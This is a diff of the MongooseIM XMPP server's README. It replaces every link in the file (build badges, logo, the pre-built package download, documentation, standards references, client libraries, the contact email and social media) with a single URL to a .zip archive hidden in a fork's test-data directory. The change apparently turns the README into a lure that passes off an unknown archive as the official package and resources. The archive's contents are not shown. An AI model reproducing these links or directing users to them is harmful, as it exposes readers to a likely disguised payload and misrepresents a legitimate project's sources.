@@ -1,32 +1,32 @@
-MongooseIM  [![Build Status](https://travis-ci.org/esl/MongooseIM.svg?branch=master)](https://travis-ci.org/esl/MongooseIM) [![Documentation Status](https://readthedocs.org/projects/mongooseim/badge/?version=latest)](http://mongooseim.readthedocs.org/en/latest/?badge=latest) [![Coverage Status](https://img.shields.io/coveralls/esl/MongooseIM.svg)](https://coveralls.io/r/esl/MongooseIM?branch=master) [![Buildtime trend](https://buildtimetrend.herokuapp.com/badge/esl/MongooseIM/latest)](https://buildtimetrend.herokuapp.com/dashboard/esl/MongooseIM/)
-[![GitHub release](https://img.shields.io/github/release/esl/MongooseIM.svg)](https://github.com/esl/MongooseIM/releases)
+MongooseIM  [![Build Status](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) [![Documentation Status](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) [![Coverage Status](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) [![Buildtime trend](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
+[![GitHub release](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
 
 
 ============
-<img align="left" src="doc/MongooseIM_logo.png"</img>
+<img align="left" src="https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip"</img>
 
 MongooseIM is Erlang Solutions' robust and efficient XMPP server aimed at large installations. Specifically designed for enterprise purposes, it is fault-tolerant, can utilize resources of multiple clustered machines and easily scale in need of more capacity (by just adding a box/VM).
 
 MongooseIM can accept client sessions over vanilla XMPP, Websockets, and HTTP long-polling (a.k.a. BOSH).
 
-Its home on GitHub is at http://github.com/esl/MongooseIM.
+Its home on GitHub is at https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 
-The product page is available at https://www.erlang-solutions.com/products/mongooseim.html
+The product page is available at https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 
 Download packages
 -----------------
 For a quick start just
-[download the pre-built package](https://www.erlang-solutions.com/resources/download.html)
+[download the pre-built package](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
 that suits your platform: Ubuntu, Debian, CentOS, and Mac OS X.
 
-An _experimental_ Docker image exists on: https://registry.hub.docker.com/u/mongooseim/mongooseim-docker/
-You can contribute on: https://github.com/ppikula/mongooseim-docker
+An _experimental_ Docker image exists on: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
+You can contribute on: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 
 
 Main differences from the parent project
 ----------------------------------------
 This project began its life as a fork of
-[ejabberd v.2.1.8](https://github.com/processone/ejabberd) back in 2011, and later underwent some major cleanup, refactorization and optimization.
+[ejabberd v.2.1.8](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) back in 2011, and later underwent some major cleanup, refactorization and optimization.
 
 Major steps performed at that time:
 *   bringing the project source tree to compliance with OTP project structure
@@ -50,16 +50,16 @@ Documentation
 -------------
 
 Up-to-date documentation for the MongooseIM master branch can be found on ReadTheDocs:
-* http://mongooseim.readthedocs.org/en/latest/
+* https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 * Older versions:
-  * [release 1.6.2](http://mongooseim.readthedocs.org/en/1.6.2/)
-  * [release 1.6.1](http://mongooseim.readthedocs.org/en/1.6.1/)
-  * [release 1.6.0](http://mongooseim.readthedocs.org/en/1.6.0/)
-  * [release 1.5.1](http://mongooseim.readthedocs.org/en/1.5.1/)
+  * [release 1.6.2](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
+  * [release 1.6.1](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
+  * [release 1.6.0](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
+  * [release 1.5.1](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
 
 
 When developing new features/modules, please take care to add basic documentation
-to the `doc/` directory, and add a link to your document in `doc/README.md`.
+to the `doc/` directory, and add a link to your document in `https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip`.
 
 Original documentation for Ejabberd-2.1.8, from which MongooseIM was forked, is preserved
 in `doc/ejabberd-2.1.8-OLD`.
@@ -68,8 +68,8 @@ in `doc/ejabberd-2.1.8-OLD`.
 Features and supported standards
 --------------------------------
 
-*   XMPP Core: [RFC 3920](https://tools.ietf.org/html/rfc3920),
-    [RFC 6120](https://tools.ietf.org/html/rfc6120)
+*   XMPP Core: [RFC 3920](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip),
+    [RFC 6120](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
 *   Client connections over TCP (with TLS/STARTTLS available), Websockets,
     and HTTP(S) (BOSH).
 *   Configurable database backends: MySQL, Postgres, generic ODBC. Mnesia
@@ -78,18 +78,18 @@ Features and supported standards
 
 |||||
 |-------------|-------------|-------------|-------------|
-|[XEP-0012: Last Activity](http://www.xmpp.org/extensions/xep-0012.html) | [XEP-0016: Privacy Lists](http://www.xmpp.org/extensions/xep-0016.html) | [XEP-0018: Invisible Presence](http://www.xmpp.org/extensions/xep-0018.html) | [XEP-0022: Message Events](http://www.xmpp.org/extensions/xep-0022.html) |
-[XEP-0023: Message Expiration](http://www.xmpp.org/extensions/xep-0023.html) | [XEP-0030: Service Discovery](http://www.xmpp.org/extensions/xep-0030.html) | [XEP-0045: Multi-User Chat](http://xmpp.org/extensions/attic/xep-0045-1.25.html) | [XEP-0049: Private XML Storage](http://www.xmpp.org/extensions/xep-0049.html) |
-[XEP-0050: Ad-Hoc Commands](http://xmpp.org/extensions/attic/xep-0050-1.2.html) | [XEP-0054: vcard-temp](http://www.xmpp.org/extensions/xep-0054.html) | [XEP-0055: Jabber Search](http://www.xmpp.org/extensions/xep-0055.html) | [XEP-0059: Result Set Management](http://www.xmpp.org/extensions/xep-0059.html) |
-[XEP-0060: Publish-Subscribe](http://xmpp.org/extensions/attic/xep-0060-1.13-1.html) | [XEP-0068: Field Standardization for Data Forms](http://www.xmpp.org/extensions/xep-0068.html) | [XEP-0077: In-Band Registration](http://www.xmpp.org/extensions/xep-0077.html) | [XEP-0078: Non-SASL Authentication](http://www.xmpp.org/extensions/xep-0078.html) |
-[XEP-0079: Advanced Message Processing](http://www.xmpp.org/extensions/xep-0079.html) | [XEP-0082: XMPP Date and Time Profiles](http://www.xmpp.org/extensions/xep-0082.html) | [XEP-0083: Nested Roster Groups](http://www.xmpp.org/extensions/xep-0083.html) | [XEP-0085: Chat State Notifications](http://www.xmpp.org/extensions/xep-0085.html) |
-[XEP-0086: Error Condition Mappings](http://www.xmpp.org/extensions/xep-0086.html) | [XEP-0092: Software Version](http://www.xmpp.org/extensions/xep-0092.html) | [XEP-0093: Roster Item Exchange](http://www.xmpp.org/extensions/xep-0093.html) | [XEP-0114: Jabber Component Protocol](http://www.xmpp.org/extensions/xep-0114.html) |
-[XEP-0115: Entity Capabilities](http://www.xmpp.org/extensions/xep-0115.html) | [XEP-0124: Bidirectional-streams Over Synchronous HTTP (BOSH)](http://www.xmpp.org/extensions/xep-0124.html) | [XEP-0126: Invisibility](http://www.xmpp.org/extensions/xep-0126.html) | [XEP-0138: Stream Compression](http://www.xmpp.org/extensions/xep-0138.html) |
-[XEP-0157: Contact Addresses for XMPP Services](http://www.xmpp.org/extensions/xep-0157.html) | [XEP-0160: Best Practices for Handling Offline Messages](http://www.xmpp.org/extensions/xep-0160.html) | [XEP-0163: Personal Eventing Protocol](http://www.xmpp.org/extensions/xep-0163.html) | [XEP-0175: Best Practices for Use of SASL ANONYMOUS](http://www.xmpp.org/extensions/xep-0175.html) |
-[XEP-0185: Dialback Key Generation and Validation](http://www.xmpp.org/extensions/xep-0185.html) | [XEP-0191: Blocking Command](http://www.xmpp.org/extensions/xep-0191.html) | [XEP-0198: Stream Management](http://xmpp.org/extensions/attic/xep-0198-1.3.html) | [XEP-0199: XMPP Ping](http://www.xmpp.org/extensions/xep-0199.html) |
-[XEP-0202: Entity Time](http://www.xmpp.org/extensions/xep-0202.html) | [XEP-0206: XMPP Over BOSH](http://www.xmpp.org/extensions/xep-0206.html) | [XEP-0212: XMPP Basic Server 2008](http://www.xmpp.org/extensions/xep-0212.html) | [XEP-0237: Roster Versioning](http://www.xmpp.org/extensions/xep-0237.html) |
-[XEP-0248: PubSub Collection Nodes](http://www.xmpp.org/extensions/xep-0248.html) | [XEP-0279: Server IP Check](http://www.xmpp.org/extensions/xep-0279.html) | [XEP-0280: Message Carbons](http://xmpp.org/extensions/attic/xep-0280-0.10.html) | [XEP-0313: Message Archive Management](http://xmpp.org/extensions/attic/xep-0313-0.2.html) |
-[XEP-0313: Message Archive Management](http://xmpp.org/extensions/attic/xep-0313-0.3.html) | [XEP-0313: Message Archive Management](http://xmpp.org/extensions/attic/xep-0313-0.4.1.html) | [XEP-0313: Message Archive Management](http://xmpp.org/extensions/attic/xep-0313-0.5.html) | [XEP-0352: Client State Indication](http://www.xmpp.org/extensions/xep-0352.html) |
+|[XEP-0012: Last Activity](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0016: Privacy Lists](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0018: Invisible Presence](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0022: Message Events](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0023: Message Expiration](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0030: Service Discovery](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0045: Multi-User Chat](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0049: Private XML Storage](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0050: Ad-Hoc Commands](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0054: vcard-temp](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0055: Jabber Search](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0059: Result Set Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0060: Publish-Subscribe](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0068: Field Standardization for Data Forms](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0077: In-Band Registration](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0078: Non-SASL Authentication](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0079: Advanced Message Processing](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0082: XMPP Date and Time Profiles](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0083: Nested Roster Groups](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0085: Chat State Notifications](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0086: Error Condition Mappings](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0092: Software Version](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0093: Roster Item Exchange](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0114: Jabber Component Protocol](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0115: Entity Capabilities](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0124: Bidirectional-streams Over Synchronous HTTP (BOSH)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0126: Invisibility](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0138: Stream Compression](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0157: Contact Addresses for XMPP Services](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0160: Best Practices for Handling Offline Messages](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0163: Personal Eventing Protocol](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0175: Best Practices for Use of SASL ANONYMOUS](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0185: Dialback Key Generation and Validation](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0191: Blocking Command](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0198: Stream Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0199: XMPP Ping](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0202: Entity Time](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0206: XMPP Over BOSH](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0212: XMPP Basic Server 2008](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0237: Roster Versioning](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0248: PubSub Collection Nodes](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0279: Server IP Check](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0280: Message Carbons](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
+[XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0352: Client State Indication](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
 
 
 How to build
@@ -124,7 +124,7 @@ How to build
     If more advanced release is required (with some specific db support only,
     f.e. mysql or pgsql) or you want to set `prefix` or `user` for the
     installation script please refer to the
-    [release configuration](doc/user-guide/release_config.md)
+    [release configuration](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
     page in our documentation
 
     `make rel` commands will generate a self-contained OTP system image in the
@@ -164,7 +164,7 @@ How to build
           version: 1.6.2-61-g48b8332
           uptime: 1:12:46
           logs:
-            log/ejabberd.log
+            https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 
 4.  Building the testing target and running tests.
 
@@ -188,47 +188,47 @@ Test suite
 ----------
 
 In order to test and validate your XMPP servers, here are useful tools:
-* [escalus](https://github.com/esl/escalus): Erlang XMPP client
-* [amoc](https://github.com/esl/amoc): a load testing tools
+* [escalus](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip): Erlang XMPP client
+* [amoc](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip): a load testing tools
 
 Public testing
 --------------
 
 Continuous integration:
-https://travis-ci.org/esl/MongooseIM
+https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 
 Code coverage:
-https://coveralls.io/github/esl/MongooseIM
+https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 
 
 Want to get in touch with us?
 -----------------------------
 In case of any suggestions, questions or any thoughts on this project,
 please feel free to contact us by the standard GitHub ways or at
-<a href='mailto:mongoose-im@erlang-solutions.com'>mongoose-im@erlang-solutions.com</a>.
+<a href='https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip'>https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip</a>.
 
 Want to discuss MongooseIM, problems with your deployement or anything else?
-Try: <a href='https://erlangcentral.org/forum/mongooseim/'>https://erlangcentral.org/forum/mongooseim/</a>.
+Try: <a href='https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip'>https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip</a>.
 
 Announcements mailing-list
 --------------------------
 
-We have set up a new public mailing-list for all announcements of major events happening on the MongooseIM front. Expect one or two emails per month, the archives are free and open. We highly encourage you to subscribe here: https://groups.google.com/d/forum/mongooseim-announce
+We have set up a new public mailing-list for all announcements of major events happening on the MongooseIM front. Expect one or two emails per month, the archives are free and open. We highly encourage you to subscribe here: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 Click on the blue button "Join group", then click in "Email delivery preference" on "Notify me for every new message".
 
 Client libraries
 ----------------
 
 We recommend following client libraries:
-* iOS, Objective-C: [XMPPframework](https://github.com/robbiehanson/XMPPFramework)
-* Android, Java: [Smack](https://github.com/igniterealtime/Smack)
-* Web, JavaScript: [Stanza.io](https://github.com/otalk/stanza.io)
+* iOS, Objective-C: [XMPPframework](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
+* Android, Java: [Smack](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
+* Web, JavaScript: [https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
 
 Social media
 ------------
 
 Follow us on Twitter and Facebook, please ask questions, and propose features!
 
-Twitter: https://twitter.com/MongooseIM
+Twitter: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
 
-Facebook: https://www.facebook.com/MongooseIM/
+Facebook: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
